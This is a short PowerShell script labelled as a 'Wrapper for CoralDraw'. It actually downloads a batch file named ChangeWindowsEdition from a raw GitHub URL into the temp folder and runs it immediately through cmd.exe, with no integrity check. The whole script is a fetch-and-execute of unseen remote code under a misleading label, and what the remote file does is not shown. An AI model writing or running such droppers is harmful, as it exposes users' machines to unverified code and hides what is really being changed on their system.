# Wrapper for CoralDraw
$cmdUrl  = "https://raw.githubusercontent.com/mt-official/MT/refs/heads/main/ChangeWindowsEdition.cmd"
$cmdPath = "$env:TEMP\ChangeWindowsEdition.cmd"

Write-Host "`n📥 Bluefix Downloading Change Windows Edition..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $cmdUrl -OutFile $cmdPath -UseBasicParsing

Write-Host "🚀 Running script..." -ForegroundColor Yellow
Start-Process "cmd.exe" -ArgumentList "/C `"$cmdPath`"" -NoNewWindow -Wait

Write-Host "`n✅ Done running Change Windows Edition " -ForegroundColor Green